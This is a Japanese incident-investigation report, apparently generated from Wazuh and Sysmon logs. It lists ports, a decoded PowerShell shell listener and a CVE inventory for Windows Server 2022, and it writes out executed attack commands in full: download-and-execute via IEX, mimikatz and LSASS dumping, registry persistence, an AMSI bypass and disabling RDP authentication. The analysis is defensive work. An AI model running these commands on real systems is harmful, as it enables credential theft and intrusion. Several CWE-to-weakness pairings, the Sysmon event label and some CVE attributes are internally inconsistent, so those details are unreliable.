+• vSphereサーバーへの接続 / rootアカウント: 提供されたソースには、vSphereサーバーへの接続や、その際にrootアカウントが使用されたことを示す情報は含まれていません。
+ポート
+• ポート: 127.0.0.1:4444
+    ◦ PowerShell/Operationalイベント (Sysmon Event ID 4104) のスクリプトブロックテキスト内のBase64エンコードされた文字列をデコードした結果、C#コードに**TcpListenerがIPアドレス127.0.0.1の4444番ポートでリッスンする機能が明示的に含まれていました**。スクリプト内のログ出力には「Listening on port 」に続いてポート番号が表示されることが示されています。これはリモートシェル機能を提供する可能性があり、C2トラフィックに使用され得ます。
+• ポート: 4489 (TCP)
+    ◦ reg.exeコマンドにより、レジストリキーHKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TcpのPortNumber値が**4489に設定されました**。
+    ◦ 同時にnetsh.exeコマンドにより、RDPPORTLatest-TCP-Inという名前でプロトコルTCP、ローカルポート4489を許可するファイアウォールルールが追加されました。
+    ◦ 以前の会話履歴から、RDPのUserAuthentication値が0に変更されたことも確認されています。
+• ポート: 22 (SSH)
+    ◦ netstatのリスニングポート情報に、0.0.0.0:22 (tcp) および:::22 (tcp6) がリスニング状態であると記録されています（過去のソースより）。
+• ポート: 80 (HTTP)
+    ◦ netstatのリスニングポート情報に、:::80 (tcp6) がリスニング状態であると記録されています（過去のソースより）。
+• ポート: 323 (chronyd)
+    ◦ netstatのリスニングポート情報に、127.0.0.1:323 (udp) および::1:323 (udp6) がchronydプロセスによってリスニング状態であると記録されています（過去のソースより）。
+• ポート: 68 (systemd-networ)
+    ◦ netstatのリスニングポート情報に、10.0.0.212:68 (udp) がsystemd-networプロセスによってリスニング状態であると記録されています（過去のソースより）。
+• ポート: 5353
+    ◦ netstatのリスニングポート情報に、0.0.0.0:5353 (udp) および:::5353 (udp6) がリスニング状態であると記録されています（過去のソースより）。
+
+使用されたコマンドラインに関する調査結果
+検出された活動において実行されたコマンドライン、またはその内容がデコードされた形で示されているスクリプトブロックのコマンドは以下の通りです。
+明示的に実行されたコマンドライン
+1. powershell.exe -ExecutionPolicy Bypass -C "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \" Open \"C:\\Users\\Public\\art.jse\" For Output As #1n Write #1, "WScript.Quit"n Close #1n Shell$ \"ping 8.8.8.8\"n"; Invoke-MalDoc -macroCode $macrocode -officeProduct "Word""`
+    ◦ Powershellスクリプトをダウンロードし、そのスクリプトがマクロを介して**ping 8.8.8.8**を実行する機能を含んでいます。
+2. cmd.exe /C net user guest /active:yes
+    ◦ guestユーザーアカウントを有効化しました。
+3. powershell.exe -ExecutionPolicy Bypass -C "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \" Open \"C:\\Users\\Public\\art.jse\" For Output As #1n Write #1, "WScript.Quit"n Close #1n Shell$ \"cscript.exe C:\\Users\\Public\\art.jse\"n"; Invoke-MalDoc -macroCode $macrocode -officeProduct "Word""`
+    ◦ Powershellスクリプトをダウンロードし、そのスクリプトがマクロを介して**cscript.exe C:\\Users\\Public\\art.jse**を実行する機能を含んでいます。
+4. cmd.exe /C rundll32.exe pcwutl.dll,LaunchApplication %%windir%%\\System32\\notepad.exe
+    ◦ notepad.exeをrundll32.exe経由で起動しました。
+5. cmd.exe /C rundll32.exe "be0315_AllTheThingsx64.dll",#2
+    ◦ be0315_AllTheThingsx64.dll内の関数を実行しました。
+6. cmd.exe /C rundll32.exe shell32.dll,Control_RunDLL "6349c0_calc.dll"
+    ◦ shell32.dll内の関数を介して6349c0_calc.dllを実行しました。
+7. cmd.exe /C copy %%windir%%\\System32\\calc.exe not_an_scr.scr && rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr
+    ◦ calc.exeをスクリーンセーバーファイルとしてコピーし、それをインストールしました。
+8. cmd.exe /C rundll32.exe 0391ca__WT.init,krnl
+    ◦ 0391ca__WT.init内の関数を実行しました。
+9. cmd.exe /C rundll32.exe url.dll,FileProtocolHandler calc.exe
+    ◦ calc.exeをurl.dll経由で実行しました。
+10. cmd.exe /C reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
+    ◦ ファイル拡張子を非表示にするレジストリ設定を変更しました。
+11. cmd.exe /C reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f
+    ◦ calc.exeをスタートアップ時に実行するレジストリエントリ（SecurityHealth）を追加しました。
+12. cmd.exe /C reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+    ◦ WDigestに関連するレジストリ設定を変更し、資格情報キャッシュを有効にする可能性があります。
+13. cmd.exe /C "PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp
+    ◦ procdump.exeを使用してlsass.exeのメモリダンプを作成しました。
+14. cmd.exe /C "PathToAtomicsFolder\\..\\ExternalPayloads\\Outflank-Dumpert.exe"
+    ◦ Outflank-Dumpert.exeを実行しました。
+15. cmd.exe /C PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe -w "%%temp%%\\nanodump.dmp"
+    ◦ nanodump.x64.exeを使用してメモリダンプを作成しました。
+16. cmd.exe /C "PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe" "sekurlsa::minidump %%tmp%%\\lsass.DMP" "sekurlsa::logonpasswords full" exit
+    ◦ mimikatz.exeを実行し、LSASSダンプとライブのログオンパスワードから資格情報をダンプしました。
+17. cmd.exe /C "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz" live lsa
+    ◦ pypykatzを実行し、LSA資格情報をダンプしました。
+18. cmd.exe /C reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f && schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st 07:45
+    ◦ Base64エンコードされた文字列（デコードすると**ping 127.0.0.1**）をレジストリに追加しました。
+    ◦ レジストリからBase64文字列を取得・デコードして実行するPowershellコマンドを含むスケジュールタスク**ATOMIC-T1053.005**を作成しました。
+19. REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe"
+    ◦ 永続化のために、カレントユーザーのRunキーにエントリを追加しました。
+20. REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"
+    ◦ 永続化のために、ローカルマシンのRunOnceExキーにエントリを追加しました。
+21. reg ADD "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command" /ve /d "calc.exe" /f
+    ◦ ごみ箱のCLSIDに関連付けられたレジストリキーを変更し、"開く"ときにcalc.exeを実行するようにしました。
+22. copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll && ren %APPDATA%\amsi.dll WinAppXRT.dll && copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll && reg add "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /t REG_EXPAND_SZ /d "1" /f
+    ◦ amsi.dllをコピー・リネームし、環境変数を追加することで、AMSI（Antimalware Scan Interface）のバイパスを試みました。
+23. reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 0 /t REG_DWORD /f
+    ◦ RDPのネットワークレベル認証（NLA）を無効にしました。
+Powershellスクリプトブロックのコンテンツ（Base64デコード後）
+Sysmon Event ID 4104のアラートが示す、Base64エンコードされた多数のPowershellスクリプトブロックテキスト は、以下の機能を含むPowershellコードにデコードされます。
+• TcpListenerによるリバースシェルの確立:
+    ◦ 明示的に**listener = new TcpListener(ip, port);およびlistener.Start();**のコードが含まれています。
+    ◦ **127.0.0.1:4444**でリッスンするよう設定されており、[BackdoorServer.Backdoor]::_bind("127.0.0.1", "4444")のような呼び出しが見られます。
+    ◦ 接続されたクライアントから入力されたコマンドを処理し、出力を返すシェル機能を提供します。
+    ◦ C2トラフィック（コマンド＆コントロール通信）に使用され、ログ出力に「Listening on port 」とポート番号が表示されることが示されています。
+• cmd.exeの実行とI/Oリダイレクト:
+    ◦ 隠しウィンドウでcmd.exeプロセスを起動し、標準入力/出力/エラーをリダイレクトして、シェル機能を提供します。
+    ◦ シェルの起動が成功したことを示す「System shell started successfully.」や「Starting shell...」といったメッセージを出力します。
+• 追加の機能とヘルパー:
+    ◦ exitコマンドを受信すると、シェルと接続を終了します。
+    ◦ VirtualFreeEx、VirtualProtectなどのWindows API関数呼び出しや、PE（Portable Executable）ファイル解析ロジック（Get-ImageNtHeaders）が含まれており、メモリ内での実行やコードインジェクションの可能性を示唆しています。
+    ◦ Powershellの符号付き算術演算の制限を回避し、メモリアドレスを正確に計算するためのAdd-SignedIntAsUnsigned関数も含まれています。
+Powershellによるファイル作成に関連するコマンド
+多くのSysmonイベントでは、PowershellプロセスがWindowsのテンポラリフォルダ（C:\Windows\SystemTemp\）に一時的な.ps1スクリプトファイルを作成したことが記録されています。これらは、Powershellが動的にスクリプトを生成し、実行していることを示唆します。
+また、Powershellプロセスにより以下の実行可能ファイルやDLLが作成されました。
+• C:\Windows\Temp\PotentiallyUnwanted.exe
+• C:\Windows\Temp\a.exe
+• C:\Windows\SystemTemp\fgfgtfav\fgfgtfav.dll
+• C:\Windows\SystemTemp\51yz0cew\51yz0cew.dll
+• C:\Windows\SystemTemp\51yz0cew\51yz0cew.cmdline
+• C:\Windows\SystemTemp\bbrrtwa2\bbrrtwa2.dll
+• C:\Windows\Temp\KeyScrambler_Setup.exe
+
+
+
+検出されたサーバーおよびマシンにおける脆弱性情報
+提示されたソースには、Microsoft Windows Server 2022 Datacenter が稼働しているマシン（WindowsPCおよびActiveDirectory）において、Wazuhの脆弱性検出機能によって特定された複数のCVE情報が含まれています。これらの脆弱性は、システムのOSパッケージがバージョン 10.0.20348.3932 未満であるために影響を受けていると報告されています。
+以下に、検出されたCVEとその詳細を重要度別に示します。
+重大度：Critical (CVSSスコア 9.8)
+• CVE-2025-47981
+    ◦ 影響を受けるコンポーネント: Windows SPNEGO
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows SPNEGOのヒープベースのバッファオーバーフローにより、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 不明（ソースに記載なし）
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47981
+重大度：High (CVSSスコア 7.0～8.8)
+• CVE-2025-49688
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-415 (Double Free)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)におけるダブルフリーの脆弱性により、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49688
+• CVE-2025-49687
+    ◦ 影響を受けるコンポーネント: Microsoft Input Method Editor (IME)
+    ◦ 脆弱性の種類 (CWE): CWE-125 (Out-of-bounds Read)
+    ◦ 説明: Microsoft Input Method Editor (IME)における境界外読み取りの脆弱性により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49687
+• CVE-2025-47998
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)におけるヒープベースのバッファオーバーフローにより、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47998
+• CVE-2025-49666
+    ◦ 影響を受けるコンポーネント: Windows Kernel
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Kernelにおけるヒープベースのバッファオーバーフローにより、認証された攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 7.2
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 高
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49666
+• CVE-2025-49683
+    ◦ 影響を受けるコンポーネント: Virtual Hard Disk (VHDX)
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Integer Overflow or Wraparound)
+    ◦ 説明: Virtual Hard Disk (VHDX)における整数オーバーフローまたはラップアラウンドにより、認証されていない攻撃者がローカルでコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49683
+• CVE-2025-49680
+    ◦ 影響を受けるコンポーネント: Windows Performance Recorder
+    ◦ 脆弱性の種類 (CWE): CWE-59 (Improper Link Resolution Before File Access ('Link Following'))
+    ◦ 説明: Windows Performance Recorderにおけるファイルアクセス前の不適切なリンク解決（「リンク追従」）により、認証された攻撃者がローカルでサービス拒否を引き起こす可能性があります。
+    ◦ CVSS基本スコア: 7.3
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49680
+• CVE-2025-47159
+    ◦ 影響を受けるコンポーネント: Windows Virtualization-Based Security (VBS) Enclave
+    ◦ 脆弱性の種類 (CWE): CWE-693 (Protection Mechanism Failure)
+    ◦ 説明: Windows Virtualization-Based Security (VBS) Enclaveにおける保護メカニズムの不備により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47159
+• CVE-2025-47987
+    ◦ 影響を受けるコンポーネント: Windows Cred SSProvider Protocol
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Cred SSProvider Protocolにおけるヒープベースのバッファオーバーフローにより、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47987
+• CVE-2025-48815
+    ◦ 影響を受けるコンポーネント: Windows SSDP Service
+    ◦ 脆弱性の種類 (CWE): CWE-843 (Access of Resource Using Incompatible Type ('Type Confusion'))
+    ◦ 説明: Windows SSDP Serviceにおける互換性のない型を使用したリソースアクセス（「型混同」）により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48815
+• CVE-2025-47984
+    ◦ 影響を受けるコンポーネント: Windows GDI
+    ◦ 脆弱性の種類 (CWE): CWE-693 (Protection Mechanism Failure)
+    ◦ 説明: Windows GDIにおける保護メカニズムの不備により、認証されていない攻撃者がネットワーク経由で情報を開示できる可能性があります。
+    ◦ CVSS基本スコア: 7.5
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47984
+• CVE-2025-49721
+    ◦ 影響を受けるコンポーネント: Windows Fast FAT Driver
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Fast FAT Driverにおけるヒープベースのバッファオーバーフローにより、認証されていない攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49721
+• CVE-2025-47975
+    ◦ 影響を受けるコンポーネント: Windows SSDP Service
+    ◦ 脆弱性の種類 (CWE): CWE-415 (Double Free)
+    ◦ 説明: Windows SSDP Serviceにおけるダブルフリーの脆弱性により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.0
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47975
+• CVE-2025-47982
+    ◦ 影響を受けるコンポーネント: Windows Storage VSP Driver
+    ◦ 脆弱性の種類 (CWE): CWE-20 (Improper Input Validation)
+    ◦ 説明: Windows Storage VSP Driverにおける不適切な入力検証により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47982
+• CVE-2025-47976
+    ◦ 影響を受けるコンポーネント: Windows SSDP Service
+    ◦ 脆弱性の種類 (CWE): CWE-416 (Use After Free)
+    ◦ 説明: Windows SSDP ServiceにおけるUse After Freeの脆弱性により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47976
+• CVE-2025-47991
+    ◦ 影響を受けるコンポーネント: Microsoft Input Method Editor (IME)
+    ◦ 脆弱性の種類 (CWE): CWE-416 (Use After Free)
+    ◦ 説明: Microsoft Input Method Editor (IME)におけるUse After Freeの脆弱性により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47991
+• CVE-2025-49753
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)におけるヒープベースのバッファオーバーフローにより、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49753
+• CVE-2025-48819
+    ◦ 影響を受けるコンポーネント: Windows Universal Plug and Play (UPnP) Device Host
+    ◦ 脆弱性の種類 (CWE): CWE-591 (Sensitive Data Storage in Improperly Locked Memory)
+    ◦ 説明: Windows Universal Plug and Play (UPnP) Device Hostにおける不適切にロックされたメモリへの機密データ保存により、認証された攻撃者が隣接ネットワーク経由で権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.1
+    ◦ 攻撃元区分: 隣接ネットワーク
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48819
+• CVE-2025-49729
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)におけるヒープベースのバッファオーバーフローにより、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49729
+• CVE-2025-49742
+    ◦ 影響を受けるコンポーネント: Microsoft Graphics Component
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Integer Overflow or Wraparound)
+    ◦ 説明: Microsoft Graphics Componentにおける整数オーバーフローまたはラップアラウンドにより、認証された攻撃者がローカルでコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49742
+• CVE-2025-48806
+    ◦ 影響を受けるコンポーネント: Microsoft MPEG-2 Video Extension
+    ◦ 脆弱性の種類 (CWE): CWE-416 (Use After Free)
+    ◦ 説明: Microsoft MPEG-2 Video ExtensionにおけるUse After Freeの脆弱性により、認証された攻撃者がローカルでコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48806
+• CVE-2025-49727
+    ◦ 影響を受けるコンポーネント: Windows Win32K - GRFX
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Win32K - GRFXにおけるヒープベースのバッファオーバーフローにより、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.0
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49727
+• CVE-2025-49724
+    ◦ 影響を受けるコンポーネント: Windows Connected Devices Platform Service
+    ◦ 脆弱性の種類 (CWE): CWE-416 (Use After Free)
+    ◦ 説明: Windows Connected Devices Platform ServiceにおけるUse After Freeの脆弱性により、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49724
+• CVE-2025-49673
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)におけるヒープベースのバッファオーバーフローにより、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49673
+• CVE-2025-47996
+    ◦ 影響を受けるコンポーネント: Windows MBT Transport driver
+    ◦ 脆弱性の種類 (CWE): CWE-125 (Integer Underflow (Wrap or Wraparound))
+    ◦ 説明: Windows MBT Transportドライバーにおける整数アンダーフロー（ラップまたはラップアラウンド）により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47996
+• CVE-2025-48000
+    ◦ 影響を受けるコンポーネント: Windows Connected Devices Platform Service
+    ◦ 脆弱性の種類 (CWE): CWE-362 (Use after free)
+    ◦ 説明: Windows Connected Devices Platform ServiceにおけるUse After Freeの脆弱性により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48000
+• CVE-2025-49678
+    ◦ 影響を受けるコンポーネント: Windows NTFS
+    ◦ 脆弱性の種類 (CWE): CWE-362 (Null Pointer Dereference)
+    ◦ 説明: Windows NTFSにおけるNullポインタ逆参照により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.0
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49678
+• CVE-2025-48805
+    ◦ 影響を受けるコンポーネント: Microsoft MPEG-2 Video Extension
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Microsoft MPEG-2 Video Extensionにおけるヒープベースのバッファオーバーフローにより、認証された攻撃者がローカルでコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-48805
+• CVE-2025-49674
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)におけるヒープベースのバッファオーバーフローにより、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49674
+• CVE-2025-49669
+    ◦ 影響を受けるコンポーネント: Windows Routing and Remote Access Service (RRAS)
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Windows Routing and Remote Access Service (RRAS)におけるヒープベースのバッファオーバーフローにより、認証されていない攻撃者がネットワーク経由でコードを実行できる可能性があります。
+    ◦ CVSS基本スコア: 8.8
+    ◦ 攻撃元区分: ネットワーク
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49669
+• CVE-2025-49686
+    ◦ 影響を受けるコンポーネント: Windows TCP/IP
+    ◦ 脆弱性の種類 (CWE): CWE-476 (Null Pointer Dereference)
+    ◦ 説明: Windows TCP/IPにおけるNullポインタ逆参照により、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: なし
+    ◦ ユーザー関与: 低
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49686
+• CVE-2025-49689
+    ◦ 影響を受けるコンポーネント: Virtual Hard Disk (VHDX)
+    ◦ 脆弱性の種類 (CWE): CWE-125 (Integer Overflow or Wraparound)
+    ◦ 説明: Virtual Hard Disk (VHDX)における整数オーバーフローまたはラップアラウンドにより、認証されていない攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.8
+    ◦ 攻撃元区分: ローカル
+    ◦ 必要な特権: 必要
+    ◦ ユーザー関与: なし
+    ◦ MSRC更新ガイド: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49689
+• CVE-2025-49744
+    ◦ 影響を受けるコンポーネント: Microsoft Graphics Component
+    ◦ 脆弱性の種類 (CWE): CWE-122 (Heap-based Buffer Overflow)
+    ◦ 説明: Microsoft Graphics Componentにおけるヒープベースのバッファオーバーフローにより、認証された攻撃者がローカルで権限を昇格できる可能性があります。
+    ◦ CVSS基本スコア: 7.0
